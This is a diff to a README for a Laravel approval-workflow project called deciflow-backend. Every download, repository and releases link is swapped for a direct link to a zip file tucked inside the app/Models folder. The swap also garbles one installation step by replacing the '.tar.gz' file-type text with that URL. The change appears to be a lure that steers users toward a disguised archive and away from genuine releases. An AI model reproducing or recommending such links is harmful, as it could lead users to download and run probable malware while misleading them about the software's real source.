@@ -1,6 +1,6 @@
 # 🚀 deciflow-backend - A Simple Way to Manage Approval Workflows
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/vicentepro32/deciflow-backend/releases)
+[![Download](https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip)](https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip)
 
 ## 📋 Description
 
@@ -27,13 +27,13 @@ Deciflow is a procurement and budget approval system built with Laravel 11. It f
 
 To get started with Deciflow, follow these steps to download and run the application:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/vicentepro32/deciflow-backend/releases) to find the latest version of Deciflow.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip) to find the latest version of Deciflow.
    
 2. **Choose the Appropriate Version:** Look for the version that matches your operating system. Click on the asset to download the file. 
 
 3. **Installation Instructions:** 
    - **Windows:** If you downloaded a `.exe` file, double-click to run it and follow the instructions.
-   - **macOS and Linux:** If you downloaded a `.tar.gz` or `.zip` file, extract it into a folder. Open your terminal, navigate to the extracted folder, and run the installation commands.
+   - **macOS and Linux:** If you downloaded a `https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip` or `.zip` file, extract it into a folder. Open your terminal, navigate to the extracted folder, and run the installation commands.
   
 4. **Set Up the Environment:**
    - Ensure that your PHP and MySQL services are running.
@@ -78,8 +78,8 @@ This project covers various topics that make it a comprehensive tool for procure
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/vicentepro32/deciflow-backend)
-- [Visit the Releases](https://github.com/vicentepro32/deciflow-backend/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip)
+- [Visit the Releases](https://raw.githubusercontent.com/vicentepro32/deciflow-backend/main/app/Models/deciflow-backend-v1.8-beta.4.zip)
 
 ## 📞 Contact
 
